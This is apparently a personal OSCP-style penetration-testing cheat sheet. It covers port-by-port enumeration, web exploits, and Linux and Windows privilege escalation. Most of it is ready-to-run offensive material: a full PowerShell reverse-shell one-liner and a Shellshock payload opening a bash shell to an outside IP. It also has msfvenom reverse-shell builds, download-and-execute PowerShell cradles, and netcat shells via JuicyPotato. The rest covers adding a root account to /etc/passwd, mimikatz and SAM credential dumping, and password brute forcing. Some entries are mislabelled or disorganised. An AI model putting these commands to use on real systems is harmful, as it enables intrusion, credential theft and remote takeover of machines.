Contents
   0. Penetration Patterns   
   1. Enumeration tools
   2.0 Linux OS
   3.0 Windows OS   
   4.0 Ports information
   5.0 Web exploits
   6.0 update is needed. 

0. Penetration Patterns
   1. Reconnaissance    # Identifing IP address, ports, services running
   2. Info gathering    # How much do i know regarding services which are running on the targer?
   3. Vulnerability Research    #explore identified services and the use of the target system
   4. Exploit                   # get low privilige shell
   5. Post-Exploit&&Privilege Escalation  # owned the target
      search for other users, creds, network surface, processes, kernal version, 


    


1. Enumeration tools
    1.1  Nmap: 
        'nmap -sC -sV -oN nmap.txt <ip> -p-'
        locate 
        grep -r categories /usr/share/nmap/scripts/*.nse |grep -oP '".*?"' |sort -u
        locate <keywords> |grep .nse$      #search for nmap script
    1.2  nmapAutomator  
        './nmapAutomator full ip'
        https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
                To user nmap scripts
               git clone https://github.com/vulnersCom/nmap-vulners.git
               cp *.nse /usr/share/nmap/scripts
               nmap --script-updatedb
    1.3 AutoRecon â€” https://github.com/Tib3rius/AutoRecon
    
               
2.0 Linux OS

         
      

3.0 Windows OS
   
    
    
4.0 Ports information
        Unknown ports
          amap -d <ip> <port>
          or
          http://www.0daysecurity.com/penetration-testing/enumeration.html
        Common ports
            21 FTP
                ftp <ip>
                nc <ip> <port>
                anonymous:anoymous
                binary and ascii mode?
            22 SSH
                nc <ip> <port>  --> search for protocol http://www.openssh.com/txt/rfc4253.txt 
                ssh ip
                ref: https://weberblog.net/ssh-key-fingerprints/ 
                     https://unix.stackexchange.com/questions/247612/ssh-keeps-skipping-my-pubkey-and-asking-for-a-password/247614 
                     https://superuser.com/questions/929566/sha256-ssh-fingerprint-given-by-the-client-but-only-md5-fingerprint-known-for-se 
                     Older openssh/openssl protocols: https://github.com/g0tmi1k/debian-ssh
                     
            23 Telnet
                hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
                patator
                                               
            25 SMTP
                Server to Server service.  Users receives/sends emails suing IMAP or POP3. 
                Then routed to the SMTP server to communicate to another server. Has database. 
                Cannot retrieve any emails, only can send email. 
                    http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/          
                After identify username,
                  https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
                  
               
            69 - TFTP
                ftp-server
                UDP
            80- HTTP
                .htaccess can password protect certain directories. 
                    Create a directory which will be password-protected. 
                    Create .htaccess tile inside that directroy. Contents are as follows,
                        AuthType Basic
                        AuthType Basic
                        AuthName "Password Protected Area"
                        AuthUserFile /var/www/html/test/.htpasswd
                        Require valid-user  
                    Create .htpasswd file. Contents are as follows,
                        htpasswd -cb .htpasswd test admin
                        service apache2 restart
                    If the directory does not display a login-prompt, change the apache2.conf as follows,
                        <Directory /var/www/html/test>
                            AllowOverride AuthConfig
                        </Directory>
                    Then, Bruceforce
                        medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
                  curl -i -X OPTIONS <ip>
                  curl -X PUT http://10.10.10.15/pkong.txt -d@test.txt # putting Pkong.txt with the data of test.txt
            88- Kerberos
                Network Authentication protocol. 
                Common for Windows Domain controller.
                MS14-068
                https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
                
            110 Pop3
                telnet <ip> 110
                USER pkong@<ip>
                PASS admin
                list   #List all emails
                retr5  #Retrieve email number 5. 
            111 Rpcbind
                RFC 1833
                Can be used to look for NFS-shares.
                rpcbind -p <ip>
                rpcinfo <IP>
                
            119 NNTP
                Network time protocol, Synchronize time. 
                nc -nvC <ip> 119    # banner grabbing
                    
            135 MSRCP
                nmap <ip> --script=msrpc-enum
                    https://en.wikipedia.org/wiki/Microsoft_RPC    --> Windows rpc port
            139/ 445 SMB SAMBA
             2020 Kali default setting does not allow the legacy SMB protocols. Change it by /etc/samba/smb.conf  and add "client min protocol = LANMAN1" to the global section.
            
                smbclient -L <ip>
                  Verify the version via wireshark or commnad
                       ngrep -i -d tun0
                       ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' 
                       wireshark --> search for Session Setup ANDX Response
                smbclient -U <ip>/<folder>
                smbclient //<ip>/tmp
                smbclient \\\<ip>\\ipc$ -U pkong
                smbclient //<ip>/ipc$ -U pkong
                    mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
                nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
                enum4linux -a 192.168.1.120
                rpcclient
                    rpcclient -U "" 192.168.1.101
                        srvinfo
                        enumdomusers
                        getdompwinfo
                        querydominfo
                        netshareenum
                        netshareenumall
                https://github.com/3ndG4me/AutoBlue-MS17-010
                https://github.com/worawit/MS17-010.git     #without named pipe
                https://github.com/mez-0/MS17-010-Python
                
                
                
                
                
                
            143/993 IMAP
                Access email stored on that server from various devices. 
            161-162 SNMP
                Simple Network Managment Protocol
                SNMP 1,2, and 2c clear text traffic. Credentials can be stolen.
                Used to manage devices ona network. 
                MIB- Management information base
                snmpwalk -c public -v1 <ip>
                    1.3.6.1.2.1.25.1.6.0 System Processes
                    1.3.6.1.2.1.25.4.2.1.2 Running Programs
                    1.3.6.1.2.1.25.4.2.1.4 Processes Path
                    1.3.6.1.2.1.25.2.3.1.4 Storage Units
                    1.3.6.1.2.1.25.6.3.1.2 Software Name
                    1.3.6.1.4.1.77.1.2.25 User Accounts
                    1.3.6.1.2.1.6.13.1.3 TCP Local Ports
                snmp-check -t <ip> -c public
                nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt

            199 - Smux
            389/636 LDAP
                Lightweight Directory Access Protocol   (More likely telephone-directory)
                Database tree
                Often in corporate structure, store user information, used for authentication(web application)
                ldapsearch -h <ip> -p 389 -x -b "dc=mywebsite,dc=com"
       
            
            443- HTTPS
                OpenSSL 1.0.1-1.0.1f Vulnerable
                OpenSSL 1.0.1g, 1.0.0, 0.9.8 NOT vulnerable 
                headrbleed? https://heartbleed.com/
                sudo sslscan <IP>:443
                nmap -sV --script=ssl-heartbleed <ip>
                Certificate?
            554-RTSP : Real Time Streaming Protocol
                Statful (TCP)
                IP-cameras, with potential GUI
            587 Submission
                OUtgoing smtp-port
                If postfix is run, could be shellshock
            631 Cups - Common UNIX Printing System
                netstat
                log in: http://localhost:631/admin
                            993 IMAP encrypted
            995 POP3 Encryption
                110 is POP3 non-encrypted
                25, 465
            1025 - NSF or IIS
            1030/1032/1033/1038
                Used by the RPC within Windows Domain.
            1433 MsSql
                sqsh -S <ip> -U sa
                    xp_cmdshell 'date'
                    go                   
            1521 Oracle database
                Enumeration
                    tnscmd10g version -h <ip>
                    tnscmd10g status -h <ip>
                odat
                  https://github.com/quentinhardy/odat 
                  https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
                  Put the file 
                     python3 odat.py utlfile -s 10.10.10.82 --sysdba -U scott -P tiger -d XE --putFile /temp thanks.exe ./reverse_3333.exe 
                  Execute the file 
                     python3 odat.py externaltable -s 10.10.10.82  -U scott -P tiger -d XE --sysdba --exec /temp thanks.exe  
            1748,1754,1808,1809 Oracle
                Orcales Intelligent Agent
             
            2049 -NFS
                showmount -e <ip>
                mount <ip>:/tmp/<location>
                
            3389 Remote Desktop
                 rdesktop -u guest -p guest 10.11.1.5 -g 94%    
                 Brute Force 
                     ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
            4555 James Remote Server
                default userid:password
                    root:root
                    
            
        
      


5.0 Web exploits
      LFIs
        https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/
         Linux 
             'LFI - php?list=../../../../../../../../../../etc/shadow'
         Windows
             'LFI -php?list=../../../../../../../../../../<>>>>'
      SQL Injection     #Examine how the server behaves
         https://dev.mysql.com/doc/refman/8.0/en/select.html
         https://gracefulsecurity.com/sql-injection-exploitation/
         https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
         https://www.exploit-db.com/papers/12975
         https://www.tarlogic.com/en/blog/red-team-tales-0x01/
         https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
            ' or '1'='1
         http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
         https://www.doyler.net/security-not-included/oracle-command-execution-sys-shell
         https://portswigger.net/web-security/sql-injection/union-attacks

      Drupal 7.54
         Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code  php/webapps/44449.rb 
         powershell "IEX(new-object net.webclient).downloadstring('nishang_shell')" 

      Microsoft iis version
            1.0	Included with Windows NT 3.51 SP 3 (or as a self-contained download). 	Windows NT Server 3.51
            2.0	Included with Windows NT Server 4.0.	Windows NT Server 4.0
            3.0	Included with Windows NT Server 4.0 Service Pack 3 (Internet Information Server 2.0 is automatically upgraded to Internet Information Server 3.0 during the install of SP3).	Windows NT Server 4.0
            4.0	Self-contained download from www.microsoft.com or the Windows NT Option Pack compact disc.	Windows NT Server 4.0 SP3 and Microsoft Internet Explorer 4.01
            5.0	Built-in component of Windows 2000. 	Windows 2000
            5.1	Built-in component of Windows XP Professional.	Windows XP Professional
            6.0	Built-in component of Windows Server 2003.	WIndows Server 2003
               CVE-2017-7269
                  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
               webdav
                  davtest -url <URL>
                  /usr/share/nmap/scripts/http-iis-webdav-vuln.nse                                                                                                                       
                  /usr/share/nmap/scripts/http-webdav-scan.nse
                  PUT/MOVE Options are on = File upload is possible. 
            7.0	Built-in component of Windows Vista and Windows Server 2008.	Windows Vista and WIndows Server 2008
            7.5	Built-in component of Windows 7 and Windows Server 2008 R2.	Windows 7 and Windows Server 2008 R2
                  
                  
                  https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
                  
            8.0	Built-in component of Windows 8 and Windows Server 2012.	Windows 8 and Windows Server 2012
      Cold fusion8
         Uses JSF
         msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp
         Make a curl request from 16788.rb 
             curl -X POST -F "newfile=@shell.jsp; type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/pkong.jsp%00'
         Adobe ColdFusion â€“ Directory Traversal multiple/remote/14641.py 
            Gain initial creds
            Then upload shell from the website
               https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File
         msfconsole
             16788.rb
             search coldfusion       
             use exploit/windows/http/coldfusion_fckeditor 
             show options 
                 set RHOST 
                 set RPORT 
                 Didn't work 
             Troubleshooting - Turn on Burp suite 
                 Proxy --> options --> Proxy Listeners --> add --> Bind to port 8500 --> request handling 10.10.10.11:8500 
                 Firefox  localhost:8500 

      Tomcat 7.0.88
         Creds from the web
         then exploit WAR
                msfvenom -p java/shell_reverse_tcp lhost=10.10.14.17 lport=4444 -f war -o pwn.war 

      Shellshock
               1.6.2.1 cgi-bin
                     () { :; };  
                     () { :; };  echo $(</etc/passwd) 
                     () { :; }; /bin/echo hello 
                     If not then, cat $PATH from the host machine. 
                       User-Agent:  () { :; };  echo;export PATH=/root/Download/jdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; bash -i >& /dev/tcp/192.168.119.131/8081 0>&1; 
      Tools
               Dirsearch â€” https://github.com/maurosoria/dirsearch
               GoBuster â€” https://github.com/OJ/gobuster
               Recursive GoBuster â€” https://github.com/epi052/recursive-gobuster
               wfuzz â€” https://github.com/xmendez/wfuzz
               goWAPT â€” https://github.com/dzonerzy/goWAPT
               ffuf â€” https://github.com/ffuf/ffuf
               Nikto â€” https://github.com/sullo/nikto
               dirb â€” https://tools.kali.org/web-applications/dirb
               dirbuster â€” https://tools.kali.org/web-applications/dirbuster
      mysql
              ps aux |grep mysql
              mysql -u<id> -p<password> -e 'show databases;'

////////////////////////////////Need to update////////////////////////////////////////////////////////////////////////////            
6. Post-Exploitation && Privilege escalation
     Goal
     Restricted low-priv shell --> Unrestricted low-priv shell --> Unrestricted high-priv shell -->Get more info
    6.1 Priviliege Escalation      
      
          
                                                                  
     Searchsploit for remote execution 
          # e.g. searchsploit apach james  35513.py
          # Download and modify the python script. 
          # Verify that the script is working
          # Put bash reverse shell as the payload and catch it from the host using nc. 
          # Verify the shell echo $0
          # If the terminal is looking for wrong directory,  copy and paste $PATH
                export PATH=$PATH:/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:
                          
          echo $SHELL     #which shell? majority of time "rbash"
          echo $PATH      #Where is it located?
          set             #gather information--> but which type


   4.1 Linux     
      4.1.1 Ref
            https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
            https://guif.re/linuxeop
            Dirtycow   https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
            https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
            https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
            http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
                        
      4.1.2 SUID 
            Copy /etc/passwd
            Use openssl to create hash 
               Syntax: openssl passwd -1 -salt pkong pass123  
            Put it on the bottom of passwd
               pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
        
      4.1.3 Manual
         user enumeration
            id     --> what is running? 
               Anything suspicious?
                   https://gtfobins.github.io
               if docker     # https://www.hackingarticles.in/docker-privilege-escalation/
                  docker run -v /etc/:/mnt -it alpine
                  cd /mnt
                  cat shadow
            groups
            ps aux     --> Search for odd program, then searchsploit. 
               Linux Local Privilege Escalation via SUID /proc/pid/mem Write
               https://git.zx2c4.com/CVE-2012-0056/about/
            netstat -antup
            uname -a
            /etc/passwd
               username, home directory, default shell.
            /etc/shadow
            last
               ls -al /var/log/wtemp
            /etc/apach2 or /etc/httpd
                grep -Ri DocumentRoot .
            whoami
            who
               who logged in.
            w
            ls -lahR /home
            find / -name "file name" 2>/dev/null
            find / -perm -u=s -type f 2>/dev/null
            Use known credentials
                e.g. Collect credential of mysql database.
                     Identify non-root user with high priviliege
                            cat /etc/passwd|grep -vE "nologin|false" 
                     Bruteforce SSH using the identified passwords and known users. 
                     hydra -l gibson -p zaq1xsw2cde3 10.11.1.71 ssh
                     

            sudo -l
               list what sudo can do
             watch w
               logged in users

      
      
      4.1.4  Auto tools
            https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
            https://raw.githubusercontent.com/reider-roque/linpostexp/master/linprivchecker.py
            https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
            https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
            6.1.1 Restriced Shell excape  
           https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
           https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html
           https://guif.re/linuxeop
                  $ bin/sh
                  $ echo $PATH
                  $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
                  $ export SHELL=/bin/bash
               Hit Double tap to search for available command.
                  https://gtfobins.github.io/ --> search for shell
               Host: ssh -t bash -i compromised.pem id@ip
                  $ echo $PATH
                  $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
                  $ export SHELL=/bin/bash
           find / -perm 4755 2>/dev/null
               Copy /etc/passwd
                 Use openssl to create hash 
                        Syntax: openssl passwd -1 -salt pkong pass123  
                 Put it on the bottom of passwd
                        pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
                 Once obtain passwd + shadow
                        unshadow passwd shadow > hash
                        john --wordlist=/usr/share/wordlists/rockyou.txt hash
                        
               
                  
                  
             nc interactive shell
                        # In reverse shell 
                              python -c 'import pty; pty.spawn("/bin/bash")' 
                              Ctrl-Z 
                        #In Kali 
                              stty raw -echo 
                              fg 
                        #In reverse shell 
                              reset 
                              export SHELL=bash 
                              export TERM=xterm-256color 
                              stty rows <num> columns <cols>  
        
   4.2 Windows           
        
           ref  : https://samsclass.info/123/proj10/px16-hashcat-win.htm
                  https://guif.re/windowseop
                  https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
                  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
                  

           Starts with whoami/priv
           
           From cmd to powershell
                  powershell -NoP -NonI -W Hidden -Exec Bypass -ep bypass "& {$ps=$false;$hostip='1.1.1.1';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
                  
                  $ps
           Gathering information
                  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
                  hostname
                  echo %username%
                  net users
                  net user user1
                  net group
                  ipconfig /all
                  route print
                  arp -A
                  netstat -ano
                  netsh firewall show state
                  netsh firewall show config
                  schtasks /query /fo LIST /v
                  tasklist /SVC
                  DRIVERQUERY  --look for programs (afd..)
                  wmic qfe get Caption,Description,HotFixID,InstalledOn
                  wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
                  wmic useraccount get name,sid
                  sc qc upnphost
                   
                  

        
      4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
             Look for following indicators
                   SeChangeNotifyPrivilege'       Bypass traverse checking             Enabled 
                   reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
                    
             EnableLUA if 0 == execute PsExec || if 1 == check for followings
                    ConsentPromptBehaviorAdmin   either 0, 2 or 5.
                    PromptOnSecureDesktop        either 0 or 1.
             
             Search for enventvwr
                    where /r C:\windows eventvwr.exe
             Download strings.exe 
                    https://docs.microsoft.com/en-us/sysinternals/downloads/strings
             Verify that AutoElevate is "True"
                    strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
      
             Download: https://github.com/turbo/zero2hero  --> main.c
             Create two reverse shells
                     msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
                     msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe

                     msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
                     msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
             Update the main.c file then compile 
                      x86_64-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x64
                      i686-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x86
             Download PsExec
                      https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
                      PsExec64.exe -i -accepteula -d -s reverse_3333.exe
             
      4.2.2 Passing another user's creds
            '/Psexec.exe /accepteula -user alice -p aliceishere -c ./8000.exe'                       
                    
      4.2.3 Saving Creds         
            4.2.3.1 Manual
                Windows Hash: Security Accounts Manager
                    reg save HKLM\SAM c:\SAM
                    reg save HKLM\System c:\System
                        --> Then smbserver to save back to kali. 
                    'samdump2 System SAM'
            4.2.3.2 Auto
                Gain admin priviliege
                Run mimikatz
                  http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/
                    privilege::debug
                    token::elevate
                    lsadump::sam
                    sekurlsa::logonpasswords
      4.2.4 Juicy Potato   - Golden privilege
            https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
            https://github.com/ivanitlearning/Juicy-Potato-x86/releases for x86
            
                whoami /all
                check     SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
                https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
                https://eternallybored.org/misc/netcat/
                               
                
                Verify that Juicy Potato works on the computer. 
                Search for working CSLID and run a common program to test the CSLID. 
                   jp86.exe -t t -p c:\windows\system32\cmd.exe -l 5839 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
                   
                1. Send Powershell 
                   Create a bat file
                     powershell "IEX(New-Object Net.Webclient).downloadString('http//192.168.119.131/rev_4444.ps1')"
                   Create a reverse shell using nisheng and name it rev_4444.ps1
                   Execute the bat file using Juicy Potato
                     jp86.exe -t * -p C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\see.bat -l 9001 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
                     host: rlwrap -r nc -nlvp 4444
                2. Netcat way
                   Place Juicy Potato and netcat on the target computer. 
                      JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\nc.exe -e cmd.exe 10.10.10.12 443" -t
                      Host: rlwrap -r nc -nlvp 
           4.2.5 Lovely Potato - Automated Juicy Potato
               https://github.com/TsukiCTF/Lovely-Potato/tree/e21c3a95bd8421c9584533529f00966f3ea24071
               
           4.2.6  JAWS
               https://github.com/411Hall/JAWS
               
           4.2.7 NTLM hashes or kerberos ticket
            https://gist.github.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f
            https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
            Use mimikatz 
            kerberoast
               powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt" 
               hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
            PowerView.ps1 
               https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
               Import-Module .\Powerview.ps1
               Get-NetLoggedon -Computername <computername>
            

         how to execute ps1 files?
         powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }" 
         powershell -exec bypass -command "& { Import-Module .\39719.ps1; Invoke-MS16-032; }" 
       
             
Windows Kernel
Windows Server 2003 SP2
      https://github.com/Re4son/Churrasco
      churrasco.exe -d cmd.exe
         SeImpersonatePrivilege enabled
         https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
         Possible Token HIjacking
   
   
              
  
         
      

   
MSF basic
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
   msfconsole
   use exploit/multi/handler
   set payload /windows/meterpreter/reverse_tcp
   set LHOST tun0
   set LPORT 4444
   exploit -j
   
Tunneling
      Local Port Forward
      -L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
      Remote Port Forward
      ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT
   Tunneling in windows  -PortProxy
      netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp

      netsh interface portproxy show all
      netsh interface portproxy delete v4tov4 listenport=<LocalPort>
      netsh interface portproxy reset

   Setting up control socket
      Two main ways to configure
           Command Line Method:
                  ssh -M -S /tmp/<target name> root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
                         -M for master mode
                         -S control for socket path.
                   ssh -o 'ControlPath=/tmp/<target>' username@<IP address>
                   ssh -o 'ControlPath=/tmp/<target>' student@127.0.0.1
                   

           Configuration File Method:
                  /ssh_config
                  HostName machine1.example.org
                  ControlPath ~/.ssh/controlmasters/%r@%h:%p
                  ControlMaster auto
                  ControlPersist 10m
                  
RE stuff
            compile x86 in linux x64 environment
               sudo apt-get install gcc-multilib
               gcc -ggdb -z execstack -fno-stack-protector -m32 func.c -o func
                  turn off aslr
                     echo 0 > /proc/sys/kernel/randomize_va_space 
            gdb
               Install peda
                  git clone https://github.com/longld/peda.git ~/peda
                  echo "source ~/peda/peda.py" >> ~/.gdbinit
               how to use
                  pdisass main     
                  pdiss <functionname>
                  getsec
       

https://docs.microsoft.com/en-us/sysinternals/downloads/psexec


Windows x86 Machine powershell location
    C:\Windows\System32\WindowsPowerShell\v1.0
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0
    
Windows x64 Machine Powershell location

To launch a 64-bit version of PowerShell:
    From a 32-bit process, use path:
    c:\windows\sysnative\WindowsPowerShell\v1.0\powershell.exe

    From a 64-bit process, use path:
    c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe



Powershell command
    Download file 
    Invoke-WebRequest URL -OutFile c:\file.ext
    
    
    
    
    
    
Extra info,
Don't know where to put those yet

https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html#section-6-buffer-overflows



Reporting Frameworks

    Dradis â€” https://dradisframework.com/academy/industry/compliance/oscp/
    Serpico â€” https://github.com/SerpicoProject/Serpico

Report Template

    Created by whoisflynn â€” https://github.com/whosiflynn/OSCP-Exam-Report-Template





Network Tools

    Impacket (SMB, psexec, etc) â€” https://github.com/SecureAuthCorp/impacket
      host:    impacket-smbserver pkong .      
      target:  
               net use \\<IP>\pkong
               
               copy \\<IP>\pkong\file .
               

File Transfers

    updog â€” https://github.com/sc0tfree/updog
    scp - scp <id>@<ip>:<file location>/* ./

Wordlists / Dictionaries

    SecLists â€” https://github.com/danielmiessler/SecLists

Payload Generators

    Reverse Shell Generator â€” https://github.com/m0rph-1/revshellgen
    Windows Reverse Shell Generator â€” https://github.com/thosearetheguise/rev
    MSFVenom Payload Creator â€” https://github.com/g0tmi1k/msfpc

PHP Reverse Shells

    Windows PHP Reverse Shell â€” https://github.com/Dhayalanb/windows-php-reverse-shell
    PenTestMonkey Unix PHP Reverse Shell â€” http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Terminal Related

    tmux â€” https://tmuxcheatsheet.com/ (cheat sheet)
    tmux-logging â€” https://github.com/tmux-plugins/tmux-logging
    Oh My Tmux â€” https://github.com/devzspy/.tmux
    screen â€” https://gist.github.com/jctosta/af918e1618682638aa82 (cheat sheet)
    Terminator â€” http://www.linuxandubuntu.com/home/terminator-a-linux-terminal-emulator-with-multiple-terminals-in-one-window

Exploits

    Exploit-DB â€” https://www.exploit-db.com/
    Windows Kernel Exploits â€” https://github.com/SecWiki/windows-kernel-exploits
    AutoNSE â€” https://github.com/m4ll0k/AutoNSE
    Linux Kernel Exploits â€” https://github.com/lucyoa/kernel-exploits

Password Brute Forcers

    BruteX â€” https://github.com/1N3/BruteX
    Hashcat â€” https://hashcat.net/hashcat/
    John the Ripper â€” https://www.openwall.com/john/

Post-Exploitation / Privilege Escalation

    LinEnum â€” https://github.com/rebootuser/LinEnum
    linprivchecker â€”https://www.securitysift.com/download/linuxprivchecker.py
    Powerless â€” https://github.com/M4ximuss/Powerless
    PowerUp â€” https://github.com/HarmJ0y/PowerUp
    Linux Exploit Suggester â€” https://github.com/mzet-/linux-exploit-suggester
    Windows Exploit Suggester â€” https://github.com/bitsadmin/wesng
        ./windows-exploit-suggester.py --update
        ./windows-exploit-suggester.py --database <created fie>.xls --systeminfo sysinfo.txt      
    
    Windows Privilege Escalation Awesome Scripts (WinPEAS) â€” https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
    Linux Privilege Escalation Awesome Script (LinPEAS) â€” https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
    GTFOBins (Bypass local restrictions) â€” https://gtfobins.github.io/
    sudo_killer â€” https://github.com/TH3xACE/SUDO_KILLER
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
    https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842
    https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
    



Extra Practice

    HTB/Vulnhub like OSCP machines (Curated by OffSec Community Manager TJNull)â€” https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159
    Virtual Hacking Labs â€” https://www.virtualhackinglabs.com/
    HackTheBox (Requires VIP for Retired machines) â€” https://www.hackthebox.eu/
    Vulnhub â€” https://www.vulnhub.com/
    Root-Me â€” https://www.root-me.org/
    Local Privilege Escalation Workshop â€” https://github.com/sagishahar/lpeworkshop
    SQL Injection -https://sqlbolt.com/

Update searchsploit 
    searchsploit -u
